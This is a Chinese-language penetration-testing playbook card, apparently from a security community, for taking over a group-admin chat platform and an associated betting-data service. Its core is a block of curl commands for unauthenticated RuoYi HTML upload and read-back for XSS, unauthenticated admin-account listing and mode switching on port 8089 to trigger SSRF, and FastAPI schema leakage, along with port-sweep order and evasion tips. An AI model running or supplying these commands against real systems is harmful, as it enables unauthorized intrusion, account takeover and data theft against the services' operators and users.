# UU/iM/8089/群管 — 多面接管手法卡（2026-09）

> 从授权战役提炼。配合 `domains/api-security/case-lessons/uu-im-8089-multiface.md`。

## 一句话

主登录卡死时横向：RuoYi 未授权上传回读 XSS + iM WebWS/C2 + 8089 注单 SSRF + FastAPI OpenAPI schema 泄；前台邀请码常为硬门。

## 打法顺序（默认）

1. **未授权面优先**（禁开局爆破）
2. 同 /24：8089、9090、8899、8443、8080、4000、6379
3. JS/OpenAPI 挖完再碰密码侧信道
4. XSS 种种种，但 TOKEX 空 ≠ 洞假

## 关键命令骨架

```bash
# RuoYi upload
curl -sk -H 'Host: admin.example' -F 'file=@x.html;type=text/html' \
  'https://IP/api/common/upload'
# 可靠回读
curl -sk -H 'Host: admin.example' \
  'https://IP/api/common/download/resource?resource=/profile/upload/....html'

# iM web inventory
# WS: /?type=web → initial devices

# 8089
curl -sk 'http://IP:8089/api/admin/accounts'
curl -sk -H 'Content-Type: application/json' -d '{"onDemandFetchEnabled":true}' \
  'http://IP:8089/api/admin/mode'
curl -sk 'http://IP:8089/api/cache/game/speed5'   # fetchTrigger.results

# FastAPI
curl -sk 'http://IP:8080/openapi.json'
curl -sk -H 'Content-Type: application/json' -d '{}' 'http://IP:8080/login'  # 422 schema
```

## 已知坑位

见 case-lesson「踩坑」表。额外：

- `Host: admin` 200 静态路径可能是 **另一套 SPA 壳**（iM），不是文件
- 138 cookie SSRF 的 UA 必须匹配历史会话 UA，否则 html mismatch
- 9090 `game_url` 强制 `mem*.…` 域名，内网 IP 直接被拒

## 与旧卡关系

- 补强 `references/ruoyi-pentest-playbook.md`：upload **可完全未授权**；download/resource 是回读关键
- 补强 `references/fastapi-tg-platform-attack-chain.md`：群管机器人标题指纹 + Form 登录
- 补强 `references/chinese-lottery-station-xxpay.md`：8089 是注单抓取器不是站本身；TCR e 码全图

---
@TGSEC社区 · @TGSEC-Qtzuu 整理
